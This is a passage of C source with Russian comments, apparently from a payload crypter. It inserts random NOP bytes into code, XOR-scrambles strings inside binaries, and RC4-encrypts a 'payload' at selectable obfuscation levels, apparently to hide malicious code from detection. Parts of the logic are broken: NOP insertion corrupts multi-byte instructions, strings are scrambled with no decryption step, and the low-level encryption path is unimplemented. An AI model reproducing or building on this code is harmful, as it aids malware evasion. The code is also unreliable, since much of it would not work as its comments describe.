    // На уровнях 2 и 3 добавляем обфускацию (вставка NOP)
    // Оценочный максимальный размер: оригинал + до 3 NOP на каждый байт + запас
    SIZE_T max_new_size = size * 4 + 16; 
    BYTE* result = (BYTE*)malloc(max_new_size);
    if (!result) return NULL;
    
    SIZE_T current_pos = 0;
    for (SIZE_T i = 0; i < size; i++) {
        // Копируем оригинальный байт
        if (current_pos < max_new_size) {
            result[current_pos++] = original[i];
        }
        
        // Вставляем случайное количество NOP (0, 1, 2 или 3)
        // Для уровня 3 делаем вероятность NOP выше
        int max_nops = (level >= 3) ? 3 : 2;
        int num_nops = rand() % (max_nops + 1);
        
        for (int j = 0; j < num_nops; j++) {
            if (current_pos < max_new_size) {
                result[current_pos++] = 0x90; // NOP
            }
        }
    }
    
    *out_size = current_pos;
    
    return result;
}

// Дополнительная функция для обфускации строк в бинарном файле
void ObfuscateStringsInBinary(BYTE* data, SIZE_T size) {
    // Простая обфускация ASCII строк
    for (SIZE_T i = 0; i < size - 4; i++) {
        // Ищем ASCII строки (последовательности печатных символов)
        if (isprint(data[i]) && isprint(data[i+1]) && isprint(data[i+2]) && isprint(data[i+3])) {
            SIZE_T str_len = 0;
            // Определяем длину строки
            while (i + str_len < size && isprint(data[i + str_len])) {
                str_len++;
            }
            
            // Обфусцируем строки длиннее 4 символов
            if (str_len > 4) {
                // XOR шифрование с ключом, зависящим от позиции
                for (SIZE_T j = 0; j < str_len; j++) {
                    data[i + j] ^= (BYTE)((i + j) & 0xFF) ^ 0x5A;
                }
                
                // Добавляем код для расшифровки перед строкой
                // Это требует более сложной модификации бинарного файла
                // и не реализовано в этом примере
                
                i += str_len;
            }
        }
    }
}

// Расширенная версия функции шифрования с дополнительной обфускацией
BYTE* AdvancedEncryptPayload(const BYTE* payload, SIZE_T size, const BYTE* key, int key_size, 
                         int obfuscation_level, SIZE_T* out_size) {
    // Для высокого уровня обфускации используем более сложный алгоритм
    if (obfuscation_level >= 3) {
        // RC4 + дополнительное запутывание
        BYTE* state = (BYTE*)malloc(256);
        BYTE* encrypted = (BYTE*)malloc(size);
        
        if (!state || !encrypted) {
            if (state) free(state);
            if (encrypted) free(encrypted);
            return NULL;
        }
        
        // Инициализация ключевого потока RC4
        for (int i = 0; i < 256; i++) {
            state[i] = i;
        }
        
        int j = 0;
        for (int i = 0; i < 256; i++) {
            j = (j + state[i] + key[i % key_size]) & 0xFF;
            // Обмен значений
            BYTE temp = state[i];
            state[i] = state[j];
            state[j] = temp;
        }
        
        // Генерация и применение ключевого потока
        int i = 0;
        j = 0;
        for (SIZE_T k = 0; k < size; k++) {
            i = (i + 1) & 0xFF;
            j = (j + state[i]) & 0xFF;
            
            // Обмен значений
            BYTE temp = state[i];
            state[i] = state[j];
            state[j] = temp;
            
            // XOR с ключевым потоком
            BYTE stream = state[(state[i] + state[j]) & 0xFF];
            encrypted[k] = payload[k] ^ stream;
        }
        
        free(state);
        *out_size = size;
        return encrypted;
    } else {
        // Для низкого уровня используем простой XOR с переменным ключом
        // return EncryptPayload(payload, size, key, key_size); // Закомментировано
        printf("[!] Ошибка: Функция EncryptPayload не реализована!\n");
        return NULL; // Возвращаем NULL, т.к. EncryptPayload не реализована
    }
}